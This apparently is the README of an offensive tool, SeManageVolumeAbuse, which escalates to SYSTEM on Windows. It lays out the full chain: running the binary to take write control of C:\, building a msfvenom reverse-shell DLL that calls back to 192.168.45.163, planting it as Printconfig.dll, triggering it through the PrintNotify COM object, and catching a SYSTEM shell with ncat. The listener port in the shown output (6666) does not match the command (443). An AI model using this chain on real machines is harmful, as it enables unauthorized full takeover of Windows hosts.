# SeManageVolumeAbuse

> Get full control over C:\ when the user has SeManageVolumePrivilege (allowing to read/write any files). One possible way to get a shell from here is to write a custom dll to C:\Windows\System32\wbem\tzres.dll & call systeminfo to trigger it.

The original abuse method of calling `systeminfo` doesn't appear to work any longer, so instead I borrowed the POC method from https://github.com/CsEnox/SeManageVolumeExploit where I built and used the binary from the current repo to give me full control over C:\ however to trigger my malicious DLL I used the following:

## Copy the built `SeManageVolumeAbuse.exe` to the target and invoke it to provide full access to `C:\`

```powershell
# Before
icacls c:\                                                                                                                                
c:\ NT AUTHORITY\SYSTEM:(OI)(CI)(F)                                                                                                       
    BUILTIN\Administrators:(OI)(CI)(F)                               
    BUILTIN\Users:(OI)(CI)(RX)                                                                                                            
    BUILTIN\Users:(CI)(AD)                                           
    BUILTIN\Users:(CI)(IO)(WD)                                                                                                            
    CREATOR OWNER:(OI)(CI)(IO)(F)

# Invoke Exploit
.\SeManageVolumeAbuse.exe                                                                                                                 
.\SeManageVolumeAbuse.exe         
Success! Permissions changed.

# After
icacls c:\
c:\ NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    BUILTIN\Users:(CI)(AD)
    BUILTIN\Users:(CI)(IO)(WD)
    CREATOR OWNER:(OI)(CI)(IO)(F)

```

## Generate malicious DLL

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.163 LPORT=443 -f dll -o Printconfig.dll
```

## Transfer the DLL to the target and then Copy it to the system folder

```powershell
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
```

## Start listener

```bash
sudo ncat -nlvp 443
```
## Invoke the PrintNotify as follows:

```powershell
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
```
## Shell achieved

```bash
$ sudo ncat -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::6666
Ncat: Listening on 0.0.0.0:6666
Ncat: Connection from 192.168.227.187.
Ncat: Connection from 192.168.227.187:49947.
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

Credits:
- https://twitter.com/0gtweet/status/1303427935647531018
- https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c
- https://github.com/CsEnox/SeManageVolumeExploit
